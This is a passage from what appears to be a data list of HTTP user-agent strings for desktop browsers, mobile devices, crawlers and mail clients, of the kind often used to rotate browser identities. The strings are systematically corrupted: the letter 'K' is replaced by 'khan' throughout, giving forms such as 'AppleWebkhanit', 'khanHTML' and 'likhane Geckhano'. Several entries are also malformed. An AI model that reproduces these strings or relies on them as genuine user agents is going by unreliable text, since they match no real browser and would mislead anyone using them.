  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebkhanit/605.1.15 (khanHTML, likhane Geckhano) Version/11.1.2",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebkhanit/533.19.4 (khanHTML, likhane Geckhano) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/603.3.8 (khanHTML, likhane Geckhano) Version/10.1.2 Safari/603.3.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebkhanit/534.59.10 (khanHTML, likhane Geckhano) Version/5.1.9 Safari/534.59.10",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebkhanit/537.75.14 (khanHTML, likhane Geckhano) Version/7.0.3 Safari/E7FBAF",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebkhanit/601.7.8 (khanHTML, likhane Geckhano)",
  "Mac OS X/10.6.8 (10khan549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebkhanit/601.7.7 (khanHTML, likhane Geckhano) Version/9.1.2 Safari/601.7.7",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebkhanit/525.18 (khanHTML, likhane Geckhano) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/600.8.9 (khanHTML, likhane Geckhano)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/601.7.8 (khanHTML, likhane Geckhano) Version/9.1.3 Safari/537.86.7",
  "MacOutlookhan/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Geckhano/20100101 Firefox/28.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Geckhano/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Geckhano/20100101 Firefox/46.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Geckhano/20100101 Firefox/44.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Geckhano/20100101 Firefox/51.0",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Geckhano/2008120121 Firefox/3.0.5",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Geckhano/20100101 Firefox/52.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/35.0.1916.153 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Geckhano/20100101 Firefox/38.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 Ckhan={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/74.0.3729.157 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; khanTXN)",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Geckhano/20100101 Firefox/7.0.1",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Geckhano/20100101 Firefox/54.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Geckhano/20100101 Firefox/40.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Geckhano/20100101 Firefox/18.0",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/46.0.2490.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.1 (khanHTML, likhane Geckhano) Chrome/21.0.1180.83 Safari/537.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/69.0.3497.100 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/63.0.3239.132 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/80.0.3987.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/85.0.4183.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/84.0.4147.105 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/67.0.3396.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Geckhano/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Geckhano Firefox/11.0 (via ggpht.com GoogleImageProxy)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.ukhan/bot.php?+)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "facebookhanexternalhit/1.1 (+http://www.facebookhan.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Geckhano/20100101 Firefox/24.0",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Geckhano/20041107 Firefox/1.0",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Geckhano/20100101 Firefox/5.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/534.24 (khanHTML, likhane Geckhano) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) HeadlessChrome/69.0.3497.81 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Geckhano/20100101 Firefox/12.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/62.0.3202.89 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Geckhano/20060124 Firefox/1.5.0.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Geckhano/20100101 Firefox/67.0",
  "Mozilla/5.0 (X11; Linux i686) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/89.0.4389.72 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Geckhano/20100101 Firefox/46.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/65.0.3325.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/80.0.3987.116 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Geckhano/20100101 Firefox/53.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
  "Wget/1.17.1 (linux-gnu)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Geckhano/20100101 Firefox/44.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Geckhano/20100101 Firefox/41.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Geckhano/20100101 Firefox/10.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Geckhano/20100101 Firefox/37.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) HeadlessChrome/79.0.3945.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Geckhano/20100101 Firefox/59.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/62.0.3202.62 Safari/537.36",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/51.0.2704.103 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Geckhano/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
  "Mozilla/5.0 (X11; Linux i686) AppleWebkhanit/537.22 (khanHTML, likhane Geckhano) Chrome/25.0.1364.172 Safari/537.22",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Geckhano/20100101 Firefox/63.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/54.0.2840.59 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Geckhano/20100101 Firefox/70.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) HeadlessChrome/76.0.3809.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) HeadlessChrome/68.0.3419.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Geckhano/20100101 Firefox/87.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Geckhano/20100101 Firefox/43.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/81.0.4044.122 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Geckhano/20100101 Firefox/66.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/56.0.2924.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Geckhano/20100101 Thunderbird/45.8.0",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebookhan.khanatana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Geckhano/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) likhane Geckhano",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
  "Outlookhan-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
  "DoCoMo/2.0 P903i",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlookhan 14.0.7162; ms-office; MSOffice 14)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Linkhan/6.3.0.0.0",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
  "Mogujie4Android/NAMhuawei/1290",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebkhanit/533.1 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Geckhano/13.0 Firefox/13.0",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Geckhano/13.0 Firefox/13.0",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebkhanit/533.1 (khanHTML, likhane Geckhano) Version/4.0 Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebkhanit/533.1 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebkhanit/534.15 (khanHTML, likhane Geckhano) CrMo/32.0.1005.22 Mobile Safari/534.15",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932Bkhan Build/OPM6.171019.030.khan1; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
  "nokhania-7.1-safari",
  "NOkhanIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54khan) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54khan) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54khan) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Geckhano/30.0 Firefox/30.0",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Geckhano/30.0 Firefox/30.0",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Geckhano/20100101 Firefox/10.0 Fennec/10.0",
  "Mozilla/5.0 (Mobile; rv:26.0) Geckhano/26.0 Firefox/26.0",
  "Mozilla/5.0 (Tablet; rv:26.0) Geckhano/26.0 Firefox/26.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/86.0.4240.198 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/51.0.2704.84 Safari/537.36",
  "Mozilla/5.0 (Linux; ; ) AppleWebkhanit/ (khanHTML, likhane Geckhano) Chrome/ Mobile Safari/",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Geckhano/20100101 Firefox/47.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Geckhano/20100101 Firefox/42.0",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebkhanit/537.36(khanHTML, likhane Geckhano) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet khan1 Build/MRA58khan; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.116 Safari/537.36",
